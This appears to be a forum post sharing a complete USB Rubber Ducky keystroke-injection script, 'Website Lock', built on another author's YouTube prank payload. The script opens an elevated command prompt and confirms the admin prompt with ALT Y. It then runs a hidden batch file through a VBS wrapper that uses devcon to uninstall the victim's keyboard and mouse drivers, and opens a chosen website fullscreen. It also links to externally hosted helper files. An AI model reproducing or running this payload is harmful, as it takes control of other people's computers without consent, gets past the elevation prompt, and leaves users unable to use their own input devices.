The explanation is in the code.
Link to other files: https://www.dropbox.com/sh/i09leu4kcifta6a/AACEFYQnlOIUsDtLLrQuemCha?dl=0 (same link as the one in the code)

Code:
```
REM Title: Website Lock
REM Author: Audiack
REM Target Ducky Encoder: 2.6.2
REM Target OS: Windows 7 (32 and 64 bit), maybe older/newer windows versions. Haven't tested it on any other than 7.
REM Description: Plays off of Aprizm's script to open a website, but it also disables the mouse and keyboard so the user can't leave the website.
REM Info:
REM     The user can easily unplug and re-plug in the keyboard/mouse to reinstall the drivers get them working again. 
REM     This requires the user to plug a USB drive in with some extra files BEFORE the ducky is plugged in.
REM     The files are here: https://www.dropbox.com/sh/i09leu4kcifta6a/AACEFYQnlOIUsDtLLrQuemCha?dl=0.
REM     Make sure the files are in the root of a drive called DUCKY.
REM     Twin duck works well with this. It is what I used when I was testing it. 
REM File Descriptions:
REM     The devcon32 & devcon64 are the files used to uninstall the keyboard and mouse drivers (for the two architectures).
REM     The invisible.vbs is used to run the batch script invisibly after the video is in fullscreen.
REM     The TheRealAnnoyance.bat is the batch script run in the background that disables their mouse & keyboard.
REM     The WebsiteLink.txt contains the website link. The user can change this as desired. Make sure there are no spaces and there is only a single link.

DELAY 3000
CTRL ESC
DELAY 700
STRING cmd
CTRL-SHIFT ENTER
DELAY 3000
ALT Y
DELAY 700

STRING for /f %d in ('wmic.exe volume get driveletter^, label ^| findstr "DUCKY"') do set myd=%d
ENTER
DELAY 1200
STRING cd /d %myd%
ENTER

DELAY 1000
STRING type "WebsiteLink.txt" | clip
ENTER
DELAY 100
STRING C:/windows/System32/wscript.exe invisible.vbs TheRealAnnoyance.bat
ENTER
DELAY 400

REM Aprizm's code for youtube roller begins here. I changed the link to a ctrl-v so that the ducky pastes the contents of WebsiteLink.txt hence line 20: 'type "WebsiteLink.txt" | clip'
REM Title: Youtube Roller
REM Author: Aprizm
REM Description: This scripts opens a youtube video in fullscreen and puts the browser in fullscreen
REM Option : if you change the link of the video dont forget to change the watch with watch_popup to have it fullscreen also add &loop=1 at the end to make it loop forever
DELAY 200
GUI r
DELAY 200
CTRL V
ENTER
DELAY 1000
F11
```